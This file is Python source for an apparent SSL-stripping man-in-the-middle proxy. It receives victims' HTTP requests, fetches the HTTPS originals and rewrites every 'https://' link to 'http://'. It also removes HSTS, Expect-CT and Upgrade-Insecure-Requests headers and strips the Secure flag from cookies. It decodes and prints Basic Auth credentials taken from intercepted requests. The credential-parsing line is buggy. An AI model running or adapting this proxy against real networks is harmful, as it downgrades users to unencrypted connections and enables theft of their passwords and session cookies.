from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler, HTTPServer
import requests
import socketserver
import logging
import base64

from networking import *
from modules import *
from scapy.layers.http import *

from http.server import SimpleHTTPRequestHandler
import requests

class ProxyHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):

        #print(f"Received GET request: {self.command} {self.path}")
        #print(f"Request Headers: {self.headers}")

        target_url = f"http://{self.headers['Host']}{self.path}"
        #target_url = f"http://{self.headers['Host']}{self.path}"
        print("target url below")
        print(target_url)
        print(self.server.server_address[1])

        #target_url_secure = f"https://{self.headers['Host']}{self.path}"
        target_url_secure = f"https://{self.headers['Host']}{self.path}"

        credentials = ""

        try:
            e_credentials = self.headers.get("Authorization")
            d_credentials = base64.b64decode(e_credentials.split(" ")[1]).decode('utf-8') 
            print(d_credentials) 
            credentials = (d_credentials.split[":"][0], d_credentials.split[":"][1])  
        except: 
            pass

        print(credentials)


        # Forward the request to the destination server
        try:
            # Forward the request to the target server
            #client_headers = dict(self.headers)

            #resp = requests.get(target_url_secure, headers=self.headers, verify=True, allow_redirects=True)
            
            if len(credentials) == 0:
                resp = requests.get(target_url_secure)
            else:
                resp = requests.get(target_url_secure, auth=credentials)
            #print(resp.text)
            print("host header")
            print(self.headers['Host'])
            print(resp.status_code)


            b_content = resp.content

            
            # Modify HTTP(S) Headers / Response
            try: b_content = b_content.replace(b"https://", b"http://")
            except: pass

            try: resp.headers.pop("Strict-Transport-Security", None)
            except: pass

            try: resp.headers.pop("Transfer-Encoding", None)
            except: pass

            try: resp.headers.pop("Content-Encoding", None)
            except: pass
            
            try: resp.headers.pop("Expect-CT", None)
            except: pass

            try: resp.headers.pop("Upgrade-Insecure-Requests", None)
            except: pass

            print("trying to send back to client")
            print(self.client_address)

            # Send the response headers back to the client
            self.send_response(resp.status_code)
            for header, value in resp.headers.items():

                try: 
                    if header == "Set-Cookie":
                        value = value.replace(f"Secure", f"")
                except: 
                    pass



                self.send_header(header, value)
                print(f"Sent: {header}: {value}")

            self.end_headers()
            # Send the response body back to the client
            #self.wfile.write(data)
            self.wfile.write(b_content)
            #print("body of response")
            #print(resp.text)

        except Exception as e:
            self.send_error(502, "Bad Gateway", str(e))


class Server:
    def __init__(self):
        self.http_daemon = None
        self.is_ready_bool = False

    def start(self, port: int):
        ip_address = get_ip_address()

        # Create a TCP server with the specified port, whilst using...
        self.http_daemon = HTTPServer(("0.0.0.0", port), ProxyHTTPRequestHandler)
        
        # Print serving ip address / port & update server status
        print("Serving at", ip_address + ":" + str(port) + "\n")
        self.is_ready_bool = True

        self.http_daemon.serve_forever() # Set server to handle requests indefinitely
    
    def is_ready(self):
        return self.is_ready_bool

    def stop(self):
        if self.http_daemon is not None:
            # Shut down server
            self.http_daemon.shutdown()
            self.http_daemon.server_close()
            
            # Cleanup variables
            self.http_daemon = None
            self.is_ready_bool = False

            print("Server closed...")


